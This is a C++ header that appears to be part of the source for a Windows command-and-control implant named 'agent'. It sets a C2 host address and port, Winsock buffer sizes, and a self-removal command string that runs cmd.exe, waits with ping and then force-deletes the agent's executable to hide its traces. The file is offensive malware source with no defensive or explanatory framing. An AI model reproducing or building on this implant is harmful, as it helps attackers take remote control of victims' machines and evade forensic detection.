#pragma once
#pragma comment (lib, "ws2_32.lib")


#include <WinSock2.h>
#include <Windows.h>

#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <intrin.h>
#include <strsafe.h>


#define APP_NAME "agent"
#define EXE_NAME "agent.exe"

#define C2_PORT 8080
#define C2_HOST "192.168.1.25"

#define SOCK_BUFF_SIZE 1024
#define MAX_USERNAME_LENGTH 256

#define SELF_REMOVE_STRING TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
